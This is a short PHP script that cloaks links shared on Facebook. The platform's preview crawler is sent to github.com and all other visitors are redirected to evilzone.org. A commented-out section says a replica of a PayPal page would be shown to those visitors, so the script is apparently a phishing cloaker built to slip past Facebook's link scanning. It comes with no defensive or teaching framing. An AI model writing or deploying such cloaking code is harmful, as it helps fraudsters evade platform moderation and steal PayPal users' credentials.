<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$isFacebook = strpos($userAgent, 'facebookexternalhit') !== false;

if ($isFacebook) {
    header("HTTP/1.1 301 Moved Permanently");
    header("Location: https://github.com/");
    exit;
//} else { ?/>
//    <!DOCTYPE html>
//    <html>
//        <head>
//	       <meta charset="utf-8">
//	       <meta name="viewport" content="width=device-width, initial-scale=1">
//            <title>Test Page</title>
//        </head>
//        <body>
//            A replica of paypal page will be rendered here.
//        </body>
//    </html>
//<?php } ?/>
} else {
    header("HTTP/1.1 301 Moved Permanently");
    header("Location: http://evilzone.org/");
    exit;
} ?>